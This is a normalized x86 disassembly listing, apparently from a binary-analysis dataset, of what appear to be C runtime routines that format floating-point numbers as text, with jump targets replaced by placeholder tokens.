add esi [ ebp - 0x54 ]
mov eax [ ebp - 0x64 ]
test eax eax
jne r-xdata
neg esi
mov [ ebp - 0x54 ] ecx
cmp cl 0x45
jle r-xdata
mov ecx [ ebp - 0x68 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x60 ]
test ecx ecx
je r-xdata
push 0x6
jmp r-xdata
sub cl 0x64
cmp cl 0x1
jbe r-xdata
mov eax [ ebp - 0x5c ]
test eax eax
jne r-xdata
add esi [ ebp + 0x18 ]
sub cl 0x64
cmp cl 0x1
ja r-xdata
cmp esi 0x1450
jg r-xdata
sub esi [ ebp + 0x1c ]
mov eax 0x7fff
mov esi 0x80000000
push 0x2
jmp r-xdata
cmp esi 0xffffebb0
jl r-xdata
mov ecx ebx
mov edx ebx
pop ebx
xor edi edi
mov ecx ebx
mov eax ebx
mov esi ebx
mov edx ebx
lea ebx [ edi + 0x1 ]
jmp r-xdata
mov edx rw-data
sub edx 0x60
test esi esi
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jns r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edx rw-data
neg esi
sub edx 0x60
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax esi
add edx 0x54
sar esi 0x3
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x4c ] esi
and eax 0x7
je r-xdata
imul ecx eax 0xc
mov eax 0x8000
add ecx edx
mov [ ebp - 0x50 ] ecx
cmp [ ecx ] ax
jb r-xdata
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x32 ]
mov eax edi
xor eax edx
mov [ ebp - 0x7c ] ebx
and eax 0x8000
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x60 ] eax
mov eax 0x7fff
and edx eax
mov [ ebp - 0x28 ] ebx
and edi eax
mov [ ebp - 0x24 ] ebx
lea eax [ edi + edx ]
movzx esi ax
mov eax 0x7fff
mov [ ebp - 0x6c ] esi
cmp dx ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x48 ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
xor eax eax
cmp [ ebp - 0x60 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
cmp di ax
jae r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
test dx dx
jne r-xdata
mov [ ebp - 0x34 ] ebx
jmp r-xdata
test di di
jne r-xdata
inc esi
test [ ebp - 0x34 ] 0x7fffffff
mov [ ebp - 0x6c ] esi
jne r-xdata
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] ebx
push 0x5
mov eax ebx
lea edx [ ebp - 0x28 ]
pop edi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x68 ] edi
inc esi
test [ ecx + 0x8 ] 0x7fffffff
mov [ ebp - 0x6c ] esi
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
add edx 0x2
inc eax
dec edi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x68 ] edi
test edi edi
jg r-xdata
lea esi [ ebp - 0x3c ]
lea esi [ esi + eax * 2 ]
lea eax [ ecx + 0x8 ]
mov [ ebp - 0x64 ] eax
cmp [ ecx + 0x4 ] ebx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov [ ebp - 0x5c ] edi
test edi edi
jle r-xdata
mov esi [ ebp - 0x6c ]
mov edx [ ebp - 0x24 ]
add esi 0xc002
mov edi [ ebp - 0x2c ]
mov [ ebp - 0x50 ] edx
test si si
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp ecx [ ebp - 0x5c ]
jae r-xdata
cmp [ ecx ] ebx
je r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
mov eax 0xffff
add esi eax
test si si
jns r-xdata
test edx edx
js r-xdata
mov [ edx - 0x4 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ ebp - 0x54 ]
mov ax [ ebp - 0x2c ]
mov ebx [ ebp - 0x7c ]
mov eax esi
neg eax
movzx eax ax
mov [ ebp - 0x68 ] eax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0x28 ]
mov edx edi
shr edx 0x1f
mov ecx eax
add eax eax
shr ecx 0x1f
or eax edx
add edi edi
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
add edx edx
mov eax 0xffff
mov [ ebp - 0x2c ] edi
or edx ecx
add esi eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x24 ] edx
test si si
jg r-xdata
sub [ ebp - 0x64 ] 0x2
add esi 0x2
dec edi
test edi edi
jg r-xdata
inc [ edx ]
mov eax [ ebp - 0x2a ]
cmp eax 0xffffffff
jne r-xdata
and edi 0x1ffff
cmp edi 0x18000
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov eax edx
shl eax 0x1f
mov [ ebp - 0x50 ] ecx
shr [ ebp - 0x50 ] 0x1
or [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
shl ecx 0x1f
shr edi 0x1
shr edx 0x1
or edi ecx
dec [ ebp - 0x68 ]
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] edi
jne r-xdata
inc ebx
movzx eax [ esi ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x78 ] ebx
movzx eax [ eax ]
imul ecx eax
mov [ ebp - 0x5c ] ecx
add ecx [ edx - 0x4 ]
cmp ecx [ edx - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x50 ]
mov edi [ ebp - 0x68 ]
mov eax [ ebp - 0x74 ]
inc eax
mov [ ebp - 0x2a ] eax
mov eax [ ebp - 0x26 ]
mov [ ebp - 0x2a ] ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x50 ]
test [ ebp - 0x2c ] 0x1
je r-xdata
push 0x0
test ebx ebx
mov [ ebp - 0x50 ] edx
pop ebx
je r-xdata
mov ax [ ebp - 0x2a ]
or esi [ ebp - 0x60 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] si
jmp r-xdata
xor eax eax
mov [ ebp - 0x38 ] ebx
cmp [ ebp - 0x60 ] ax
mov [ ebp - 0x3c ] ebx
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x34 ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x26 ] eax
mov ax [ ebp - 0x22 ]
mov ecx 0xffff
mov [ ebp - 0x26 ] ebx
cmp ax cx
jne r-xdata
mov ax di
xor edi edi
inc edi
or ax di
mov [ ebp - 0x2c ] ax
mov edi [ ebp - 0x2c ]
jmp r-xdata
mov esi [ ebp - 0x4c ]
mov edx [ ebp - 0x54 ]
mov eax 0x7fff
cmp si ax
jb r-xdata
inc ax
mov [ ebp - 0x22 ] ax
jmp r-xdata
mov [ ebp - 0x22 ] dx
inc esi
jmp r-xdata
mov edx 0x8000
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x24 ]
jmp r-xdata
sub_40b7bc
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b7dd
add esp 0x1c
pop ebp
retn
sub_40b7dd
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bd2e
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bee8
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b863
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bfa9
jmp r-xdata
sub_40b863
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x30
pop eax
push [ ebp + 0x1c ]
mov ecx eax
mov [ ebp - 0x8 ] 0x3ff
mov [ ebp - 0x4 ] ecx
xor ebx ebx
lea ecx [ ebp - 0x2c ]
call sub_40281d
mov edi [ ebp + 0x14 ]
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edi ebx
call sub_4028d9
push 0x16
jmp r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
pop edi
mov [ eax ] edi
call sub_402521
jmp r-xdata
lea eax [ edi + 0xb ]
mov [ esi ] bl
cmp ecx eax
ja r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_4028d9
push 0x22
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
xor eax eax
cmp eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov ebx [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
mov [ esi + 0x1 ] al
mov ecx [ edx + 0x4 ]
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
xor eax eax
or eax ecx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov [ esi ] 0x2d
inc esi
and ebx 0x80000000
or eax ebx
je r-xdata
or eax 0xffffffff
cmp ecx eax
je r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
push 0x30
pop eax
mov [ esi + 0x2 ] al
add esi 0x3
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x0
push edi
push eax
lea ebx [ esi + 0x2 ]
push ebx
push edx
call sub_40bbbf
mov edi eax
add esp 0x14
test edi edi
je r-xdata
lea eax [ ecx - 0x2 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x3fe
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
and [ ebp + 0x14 ] 0x0
mov ecx 0xf0000
mov eax [ ebp - 0x4 ]
mov [ ebp + 0xc ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x18 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0xc ] ecx
test edi edi
jne r-xdata
mov edi [ ebp + 0x18 ]
test edi edi
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
lea eax [ esi + 0x2 ]
push 0x65
push eax
call sub_40cb30
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
and edx 0xfffff
movsx ecx cx
call sub_40cf50
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
xor edi edi
jmp r-xdata
test edi edi
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
and edx 0xfffff
movsx ecx cx
call sub_40cf50
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
shrd eax ecx 0x4
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_406fb0
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_40cf50
mov ecx eax
mov ebx edx
xor eax eax
and ecx 0x7ff
and ebx eax
sub ecx [ ebp - 0x8 ]
sbb ebx eax
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx eax
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
cmp esi edi
jne r-xdata
mov edx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp ecx eax
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push eax
push 0xa
push ebx
push ecx
call sub_40ce70
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
mov [ ebp - 0x18 ] ebx
xor eax eax
cmp ebx eax
jl r-xdata
push eax
push edx
push ebx
push ecx
call sub_40ce70
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
xor eax eax
cmp esi edi
jne r-xdata
cmp ecx edx
jb r-xdata
mov [ esi ] 0x30
mov edi esi
cmp ebx eax
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
add cl 0x30
mov edi eax
mov [ esi ] cl
mov [ esi + 0x1 ] al
jg r-xdata
push eax
push 0x64
push ebx
push ecx
call sub_40ce70
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
xor eax eax
cmp ebx eax
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_40bbdd
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push edi
push [ ebp + 0x20 ]
call sub_40281d
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_4028d9
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
pop edi
mov [ eax ] edi
call sub_402521
jmp r-xdata
mov edx [ ebp + 0x10 ]
xor edi edi
mov eax edx
test edx edx
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edi
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_4028d9
push 0x22
mov eax [ ebp + 0x18 ]
push esi
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x18 ]
xor eax eax
test edx edx
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
call sub_40c232
mov edx [ ebp + 0x10 ]
pop ecx
pop ecx
test edx edx
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x1c ] al
sete al
add eax edx
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_4086c5
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
push edi
push edi
push edi
push edi
push edi
call sub_402531
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] edi
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop esi
je r-xdata
mov edx [ edx + 0x4 ]
dec edx
jns r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop ebx
cmp edx ebx
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_40c4e0
add esp 0xc
push 0xa
pop ebx
cmp edx ebx
jl r-xdata
mov eax edx
cdq
idiv ebx
add [ esi + 0x2 ] al
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv ebx
add [ esi + 0x3 ] al
sub_40bd2e
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_40cddf
add esp 0x14
test edi edi
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_4028d9
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_4028d9
push 0x16
pop esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push ecx
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
xor eax eax
test ebx ebx
setg al
add ecx edi
add eax ecx
push eax
call sub_40cc67
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov ecx esi
cmp [ ebp - 0x2c ] 0x2d
sete al
sub ecx eax
xor eax eax
test ebx ebx
setg al
sub ecx eax
mov [ eax ] esi
call sub_402521
mov eax esi
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
push ebx
push esi
push edi
call sub_40bbdd
add esp 0x1c
mov [ edi ] 0x0
jmp r-xdata
sub_40bdfc
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
push ebx
push esi
push [ ebp + 0x1c ]
mov eax [ eax + 0x4 ]
dec eax
mov [ ebp - 0x4 ] eax
call sub_40281d
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4028d9
push 0x16
pop ebx
mov [ eax ] ebx
call sub_402521
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp [ ebp + 0x18 ] bl
je r-xdata
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x14 ]
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx edi
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jg r-xdata
mov [ esi ] 0x2d
inc esi
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + esi ] 0x30
add esi eax
push 0x1
push esi
call sub_40c232
pop ecx
mov [ esi ] 0x30
inc esi
pop ecx
jmp r-xdata
pop edi
push 0x1
push esi
call sub_40c232
mov eax [ ebp - 0x14 ]
pop ecx
pop ecx
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov eax [ eax + 0x4 ]
test eax eax
jns r-xdata
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
neg eax
cmp edi eax
jl r-xdata
mov edi eax
neg edi
jmp r-xdata
push edi
push esi
call sub_40c232
push edi
push 0x30
push esi
call sub_406fb0
add esp 0x14
mov edi eax
sub_40bee8
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_40cddf
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_4028d9
mov [ eax ] ebx
call sub_402521
mov eax ebx
jmp r-xdata
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_4028d9
mov [ eax ] ebx
call sub_402521
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
add eax ebx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
push ecx
sete al
add eax edi
push eax
call sub_40cc67
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov ecx esi
cmp [ ebp - 0x2c ] 0x2d
sete al
sub ecx eax
pop esi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push ebx
push esi
push edi
call sub_40bdfc
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
sub_40bfa9
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_40cddf
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_4028d9
mov [ eax ] ebx
call sub_402521
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2c ]
xor ecx ecx
dec eax
cmp [ ebp - 0x30 ] 0x2d
mov [ ebp - 0x20 ] eax
sete cl
or eax 0xffffffff
lea ebx [ ecx + edi ]
cmp esi eax
je r-xdata
call sub_4028d9
mov [ eax ] ebx
call sub_402521
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x30 ]
push ecx
push [ ebp + 0x14 ]
push eax
push ebx
call sub_40cc67
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub eax ecx
pop esi
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ edi ] 0x0
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push edi
call sub_40bbdd
add esp 0x1c
cmp eax [ ebp + 0x14 ]
jge r-xdata
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push esi
push edi
call sub_40bdfc
add esp 0x18
jmp r-xdata
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
mov [ ebx - 0x2 ] al
sub_40c0b9
push ebp
mov ebp esp
sub esp 0x10
push edi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
mov edx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
mov cl [ edx ]
test cl cl
je r-xdata
mov al [ edx ]
inc edx
test al al
je r-xdata
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
jmp r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edx ]
test al al
jne r-xdata
cmp cl al
je r-xdata
cmp al 0x65
je r-xdata
push esi
mov esi edx
cmp al 0x45
je r-xdata
dec edx
cmp [ edx ] 0x30
je r-xdata
mov eax [ edi + 0x84 ]
mov ecx [ eax ]
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
inc edx
mov al [ esi ]
inc edx
inc esi
mov [ edx ] al
test al al
jne r-xdata
dec edx
pop esi
sub_40c151
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_40a462
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_40a3d4
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
add esp 0xc
mov esp ebp
pop ebp
retn
sub_40c1a4
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push esi
push [ ebp + 0xc ]
call sub_40281d
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40a304
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_40c4b3
test eax eax
movsx eax [ esi ]
push eax
call sub_40a304
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp - 0x10 ]
mov cl [ esi ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40c218
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
fldz
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_40c232
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_408310
inc eax
push eax
lea eax [ esi + edi ]
push esi
push eax
call sub_40c4e0
add esp 0x10
pop esi
sub_40c25a
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_40cf6f
add esp 0xc
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_402531
int3
pop esi
retn
sub_40c281
push ebp
mov ebp esp
sub esp 0x1c
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
mov eax 0x404e
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov ecx edx
mov [ ebp + 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebx + 0x8 ]
test edx 0x8000
jne r-xdata
mov edx [ ebx + 0x4 ]
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx ]
mov esi [ ebx + 0x4 ]
mov ecx [ ebx ]
mov esi edx
mov eax ecx
shl edx 0x10
shr eax 0x10
or edx eax
shr esi 0x10
mov eax [ ebp - 0x4 ]
shl ecx 0x10
add eax 0xfff0
mov [ ebx ] ecx
